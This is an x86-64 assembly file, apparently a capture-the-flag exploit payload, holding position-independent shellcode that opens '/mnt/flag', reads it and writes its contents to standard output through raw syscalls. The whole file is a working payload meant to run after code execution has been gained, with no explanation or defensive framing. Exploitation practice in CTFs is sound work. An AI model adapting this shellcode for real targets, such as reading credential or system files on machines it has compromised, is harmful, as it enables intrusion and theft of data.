

.intel_syntax noprefix
.text
.global shellcode

shellcode:
/* open */
lea rbx, [rip+flag]
mov     rdi, rbx
xor     rsi, rsi
xor     rdx, rdx
mov     eax, 2
syscall

/* read */
sub rsp, 0x100
push rax
mov rdi, rax
lea rbx, [rsp+0x8]
mov     rsi, rbx
mov     rdx, 0x100
mov eax, 0
syscall

/* write */
pop rax
mov rdi, 1
lea rbx, [rsp]
mov     rsi, rbx
mov     rdx, 0x100
mov eax, 1
syscall

ud2

/************* Fake data section *************/
/* we just want these read-only data to be near our pie code. Similar to arm64 :) */
flag:                                 
.ascii "/mnt/flag\0"

